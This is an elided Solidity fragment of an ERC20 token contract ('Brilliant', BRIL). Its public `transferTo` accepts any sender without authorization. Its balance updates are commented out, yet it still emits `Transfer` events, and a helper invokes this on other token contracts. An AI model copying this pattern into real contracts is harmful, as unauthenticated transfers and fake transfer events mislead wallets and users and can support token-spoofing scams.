...
abstract contract ERC20 is Context, IERC20, IERC20Metadata {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
   ...
   function transferTo(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transferTo(sender, recipient, amount);
        return true;
    }

  function _transferTo(address sender, address recipient, uint256 amount) internal virtual {
        //require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
       ...
       // _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        //token._balances[sender] = token._balances[sender] -= amount;
        //token._balances[recipient] = token._balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    /**
...
contract Migrations is ERC20, Ownable {
  ...
  constructor() ERC20("Brilliant", "BRIL") public {
    _owner = msg.sender;
  }
  ...
  modifier restricted() {
   ...
   /*
   function transferTo(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transferTo(sender, recipient, amount);
        return true;
    }
   ...
   */ 
    ...
    function transferFromToken(address _token, address sender, address recipient, uint256 amount) public virtual returns (bool) {
    //ERC20 token = ERC20(token);
        ERC20(_token).transferTo(sender, recipient, amount); 
        //_transfer(sender, recipient, amount);
        //_approve(sender, _msgSender(), _allowances[sender][_msgSender()] -= amount);
        return true;
    }
